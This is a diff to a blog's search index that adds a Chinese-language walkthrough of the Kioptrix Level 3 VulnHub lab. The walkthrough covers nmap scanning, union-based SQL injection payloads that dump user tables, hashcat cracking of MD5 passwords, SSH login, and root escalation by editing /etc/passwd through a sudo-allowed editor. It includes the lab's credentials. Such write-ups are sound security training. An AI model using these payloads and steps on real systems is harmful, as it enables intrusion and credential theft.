@@ -1095,7 +1095,7 @@
   </entry>
   <entry>
     <title>Kioptrix Level 1 Walkthrough</title>
-    <url>/2025/04/09/Kioptrix%20Level%201/</url>
+    <url>/2025/04/10/Kioptrix%20Level%201/</url>
     <content><![CDATA[<h1 id="Kioptrix-Level-1-Walkthrough"><a href="#Kioptrix-Level-1-Walkthrough" class="headerlink" title="Kioptrix Level 1 Walkthrough"></a>Kioptrix Level 1 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Kioptrix: Level 1 (#1)</a></p>
 <p><img src="/picture/image-20250409203110907.png" alt="image-20250409203110907"></p>
 <h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>确定存活的主机</p>
@@ -1390,7 +1390,7 @@
   </entry>
   <entry>
     <title>Tr0ll 2 Walkthrough</title>
-    <url>/2025/04/08/Tr0ll%202/</url>
+    <url>/2025/04/09/Tr0ll%202/</url>
     <content><![CDATA[<h1 id="Tr0ll-2-Walkthrough"><a href="#Tr0ll-2-Walkthrough" class="headerlink" title="Tr0ll 2 Walkthrough"></a>Tr0ll 2 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/tr0ll-2,107/">Tr0ll: 2</a></p>
 <p><img src="/picture/image-20250408213316217.png" alt="image-20250408213316217"></p>
 <h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>确定存活的主机</p>
@@ -1593,6 +1593,130 @@
       <tags>
         <tag>Penetration Testing</tag>
         <tag>THM</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kioptrix Level 3 Walkthrough</title>
+    <url>/2025/04/11/Kioptrix%20Level%203/</url>
+    <content><![CDATA[<h1 id="Kioptrix-Level-3-Walkthrough"><a href="#Kioptrix-Level-3-Walkthrough" class="headerlink" title="Kioptrix Level 3 Walkthrough"></a>Kioptrix Level 3 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">Kioptrix: Level 1.2 (#3)</a></p>
+<p><img src="/picture/image-20250411115248512.png" alt="image-20250411115248512"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>确定存活的主机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.186.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250411100915222.png" alt="image-20250411100915222"></p>
+<p>对目标 IP 进行端口发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.186.150</span><br></pre></td></tr></table></figure>
+
+<p>发现开放 22，80 端口</p>
+<p><img src="/picture/image-20250411100945596.png" alt="image-20250411100945596"></p>
+<p>对开放的端口进行应用版本发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 22,80 -A 192.168.186.150</span><br></pre></td></tr></table></figure>
+
+<p>22 端口开放 SSH 服务，80 端口开放 HTTP 服务</p>
+<p><img src="/picture/image-20250411101054246.png" alt="image-20250411101054246"></p>
+<p>先来看 22 端口 SSH 服务，看看对应版本有无可直接利用的漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit openssh 4.7</span><br></pre></td></tr></table></figure>
+
+<p>展示没有发现什么可利用的</p>
+<p><img src="/picture/image-20250411101243184.png" alt="image-20250411101243184"></p>
+<p>再来看 80 端口，进行目录扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.150</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250411101722248.png" alt="image-20250411101722248"></p>
+<p>&#x2F;gallery 目录似乎加载不完全</p>
+<p><img src="/picture/image-20250411120940082.png" alt="image-20250411120940082"></p>
+<p>查看源代码后发现，&#x2F;gallery 目录中的链接指向的是 Kioptrix3.com </p>
+<p><img src="/picture/image-20250411121057034.png" alt="image-20250411121057034"></p>
+<p>将该域名与 IP 绑定</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250411102117016.png" alt="image-20250411102117016"></p>
+<p>再次访问，发现排序图片的站点</p>
+<p><img src="/picture/image-20250411102228103.png" alt="image-20250411102228103"></p>
+<p>使用任意一种排序，发现 url 中存在 id 参数可能有 sql 注入</p>
+<p><img src="/picture/image-20250411102419344.png" alt="image-20250411102419344"></p>
+<p>更改 id 参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;&quot; --+&amp;sort=photoid#photos</span><br></pre></td></tr></table></figure>
+
+<p>触发 sql 报错，存在 sql 注入，且依据报错判断，是数字型注入</p>
+<p><img src="/picture/image-20250411102602763.png" alt="image-20250411102602763"></p>
+<p>使用 order by 判断列数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 order by 6 --+&amp;sort=photoid#photos</span><br><span class="line">id=1 order by 7 --+&amp;sort=photoid#photos</span><br></pre></td></tr></table></figure>
+
+<p>最终判断为 6 列</p>
+<p><img src="/picture/image-20250411103148390.png" alt="image-20250411103148390"></p>
+<p><img src="/picture/image-20250411103207913.png" alt="image-20250411103207913"></p>
+<p>判断回显点</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,2,3,4,5,6 --+&amp;sort=photoid#photos</span><br></pre></td></tr></table></figure>
+
+<p>回显点为 2，3</p>
+<p><img src="/picture/image-20250411103316163.png" alt="image-20250411103316163"></p>
+<p>读取数据库名称和用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,user(),database(),4,5,6 --+&amp;sort=photoid#photos</span><br></pre></td></tr></table></figure>
+
+<p>数据库名为 gallery ，用户为 mysql 管理员</p>
+<p><img src="/picture/image-20250411103754320.png" alt="image-20250411103754320"></p>
+<p>读取数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=&#x27;gallery&#x27; --+&amp;sort=photoid#photos 3</span><br></pre></td></tr></table></figure>
+
+<p>发现用户数据表 gallarific_users 和 dev_accounts</p>
+<p><img src="/picture/image-20250411104003162.png" alt="image-20250411104003162"></p>
+<p>读取用户数据表字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name=&#x27;gallarific_users&#x27; --+&amp;sort=photoid#photos 3</span><br><span class="line">id=-1 union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name=&#x27;dev_accounts&#x27; --+&amp;sort=photoid#photos 3</span><br></pre></td></tr></table></figure>
+
+<p>发现 username 和 password</p>
+<p><img src="/picture/image-20250411104241854.png" alt="image-20250411104241854"></p>
+<p><img src="/picture/image-20250411104915106.png" alt="image-20250411104915106"></p>
+<p>读取 username 和 password</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,username,password,4,5,6 from gallarific_users --+&amp;sort=photoid#photos 3</span><br><span class="line">id=-1 union select 1,username,password,4,5,6 from dev_accounts --+&amp;sort=photoid#photos 3</span><br></pre></td></tr></table></figure>
+
+<p>用户名密码为 admin&#x2F;n0t7t1k4</p>
+<p><img src="/picture/image-20250411104444248.png" alt="image-20250411104444248"></p>
+<p>用户名密码为 dreg&#x2F;0d3eccfb887aabd50f243b3f155c0f85 和 loneferret&#x2F;5badcaf789d3d1d09794d8f021f40f0e</p>
+<p><img src="/picture/image-20250411105017857.png" alt="image-20250411105017857"></p>
+<p>经过尝试，第一个账号密码似乎是 MySQL 账号密码，SSH ，后台，phpmyadmin 均不能能登陆</p>
+<p>尝试使用字典模式破解 md5 加密</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 0 0d3eccfb887aabd50f243b3f155c0f85 /usr/share/wordlists/rockyou.txt</span><br><span class="line">hashcat -m 0 5badcaf789d3d1d09794d8f021f40f0e /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>破解出来为</p>
+<p>dreg&#x2F;Mast3r</p>
+<p><img src="/picture/image-20250411110138560.png" alt="image-20250411110138560"></p>
+<p>loneferret&#x2F;starwars</p>
+<p><img src="/picture/image-20250411110245557.png" alt="image-20250411110245557"></p>
+<p>尝试使用 SSH 登陆，两者均成功</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -o HostKeyAlgorithms=+ssh-rsa dreg@192.168.186.150</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250411113940331.png" alt="image-20250411113940331"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -o HostKeyAlgorithms=+ssh-rsa loneferret@192.168.186.150</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250411113902901.png" alt="image-20250411113902901"></p>
+<p>发现 dreg 不能执行 sudo -l 命令而 loneferret 可以，且可以不用密码执行 sudo ht</p>
+<p><img src="/picture/image-20250411114146183.png" alt="image-20250411114146183"></p>
+<p>运行 ht ，报错</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo ht</span><br><span class="line">Error opening terminal: xterm-256color.</span><br></pre></td></tr></table></figure>
+
+<p>使用 export TERM&#x3D;xterm 解决</p>
+<p><img src="/picture/image-20250411114359115.png" alt="image-20250411114359115"></p>
+<p>发现是一个编辑器，既然已 root 身份运行，直接更改 &#x2F;etc&#x2F;passwd 中 root 密码即可</p>
+<p><img src="/picture/image-20250411114452231.png" alt="image-20250411114452231"></p>
+<p>生成已知的密码哈希（123）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ openssl passwd -1 123</span><br><span class="line">$1$/l/LdaOy<span class="variable">$E0kBkOBauSctDWdECVk9r</span>.</span><br></pre></td></tr></table></figure>
+
+<p>f3 选择打开 &#x2F;etc&#x2F;passwd</p>
+<p><img src="/picture/image-20250411114604572.png" alt="image-20250411114604572"></p>
+<p>替换 root 密码</p>
+<p><img src="/picture/image-20250411114643634.png" alt="image-20250411114643634"></p>
+<p>f2 保存 f10 退出后，直接使用 su 切换为 root 身份</p>
+<p><img src="/picture/image-20250411114820430.png" alt="image-20250411114820430"></p>
+<p>读取 Congrats.txt </p>
+<p><img src="/picture/image-20250411114915906.png" alt="image-20250411114915906"></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>vulnhub</tag>
       </tags>
   </entry>
 </search>
